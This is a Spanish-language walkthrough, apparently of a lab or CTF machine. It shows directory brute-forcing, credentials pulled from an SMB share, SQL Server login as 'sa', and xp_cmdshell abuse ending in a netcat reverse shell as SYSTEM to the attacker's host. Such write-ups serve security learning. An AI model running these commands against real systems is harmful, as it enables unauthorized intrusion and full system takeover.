PORT      STATE SERVICE
9081/tcp    open  http
445/tcp      open smb
49992/tcp  open Microsoft SQL Server

-Entramos a la web del puerto 9081 y encontramos un panel de login

-hacemos fuerza bruta de directorios y encontramos la ruta /downloads, entramos y encontramos el archivo 'nota.txt' con el siguiente contenido:
	supervisor
	supervisor

-Pueden ser unas credenciales , probamos en el panel de login. FUNCIONA!!

-Dentro de la aplicación web no podemos ganar acceso, es un Rabbit Hole

-Listamos el contenido de SMB con smbclient:
	ADMIN$          Disk      Admin remota
	C$              Disk      Recurso predeterminado
	Compac          Disk      
	IPC$            IPC       IPC remota
	Users           Disk 

-Entramos dentro de la carpteta 'Compac' y nos traemos el archivo SQL.txt
	-smb: \Empresas\> get SQL.txt

-El archivo tiene el siguiente contenido:
	SQL 2017 
	Instancia COMPAC 
	 sa 
	 Contpaqi2023.

-Son credenciales de una BD Sql Server, nos podemos autenticar en Microsoft SQL Server con la herramienta --> **impacket-myssqlclient**

-Nos autenticamos en Microsoft SQL Server proporcionando la Instancia, el usuario, la contraseña y el puerto:
	-impacket-mssqlclient COMPAC/sa:Contpaqi2023.@192.168.1.131 -port 49992
		SQL (sa  dbo@master)> xp_cmdshell whoami
			nt \authority system

-Podemos ejecutar comando como root pero no tenemos una shell como root

-Nos copiamos el binario de netcat (windows) en el directorio actual (de nuestra máquina) y abrimas un servidor con --> **'impacket-smbserver'** para compartirlo (es como si lo compartimos con un servidor de Python). 
	-Nos copiamos el binario de Netcat: 
		-cp /usr/share/windows-resources/binaries/nc.exe .
	-Abrimos servidor para compartir el archivo:
		-impacket-smbserver -smb2support carpx .

-Una vez tenemos el binario de Netcat sirviendo desde el servidor, ejecutamos el siguiente comando dentro de SQL Server para entablarnos una reverse shell como root:
	-SQL (sa  dbo@master)> xp_cmdshell \\192.168.1.135\carpx\nc.exe 192.168.1.135 1234 -e cmd
		C:\Windows\system32>whoami
		nt authority\system




